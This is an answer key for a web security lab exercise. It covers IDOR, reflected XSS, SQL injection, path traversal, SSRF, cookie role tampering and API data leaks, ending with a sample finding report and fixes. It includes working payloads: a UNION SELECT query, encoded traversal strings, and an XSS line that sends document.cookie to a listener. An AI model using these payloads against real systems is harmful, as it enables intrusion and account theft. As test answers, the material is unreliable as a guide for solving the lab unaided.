# Web lab answers

## 1. Parameters

`user`, `id`, `q`, `file`, `url`. The API path also takes an object id.

## 2. IDOR

`/profile?id=2` while logged in as alice returns bob's email and balance. The handler uses the query id and never compares it with the session `uid`.

## 3. XSS

`/search?q=` inserts the value into HTML without escaping. The response contains the raw tag. It is reflected, so the proof is execution in a browser, not only the string.

## 4. SQL injection

`/item?id=1 OR 1=1` returns the first item. The query is built with an f-string.

Union payload:

```text
/item?id=1 UNION SELECT id,name,balance FROM users WHERE id=3
```

The `price` column shows the admin balance.

## 5. Path traversal

```text
/download?file=../../README.md
```

`os.path.join(ROOT, name)` does not normalize or constrain the result. From the lab directory, two levels up reaches the repository README. Three levels reaches the parent workspace.

## 6. SSRF

`/fetch?url=http://127.0.0.1:8099/health` returns `ok`. A closed port returns `fetch failed: [Errno 111] Connection refused`. The server calls `urlopen` on any URL.

## 7. Client-controlled role

`Cookie: role=admin` is enough. The app never checks the role against the database. A user can edit the cookie and become admin.

## 8. API leak

`/api/users/2` returns bob's email, role, and balance with no authentication.

## 9. Difference

The API returns `role` and a stable JSON object. It is easier to enumerate and parse than the HTML profile. Both lack authorization.

## 10. Report shape

```markdown
### IDOR: any user can read another profile

- Request: GET /profile?id=2 with alice's cookie
- Response: bob@lab.local, balance 250
- Impact: email and balance disclosure across accounts
- Root cause: id comes from the query, session uid is ignored
- Fix: compare the object owner with the session user, or scope the query by uid
```

## Stretch notes

- UNION needs the same column count and compatible types. `items` has 3 columns.
- Encoded traversal: `..%2f..%2fREADME.md` survives some parsers. Try double encoding.
- XSS cookie theft: `fetch('http://127.0.0.1:9000/?c='+document.cookie)` with a listener on 9000. The `role` cookie is readable because it has no HttpOnly.
- Fixes: parameterized SQL, `html.escape`, `Path.resolve().is_relative_to`, an allowlist for fetch, a signed session, and an auth check on both profile paths.
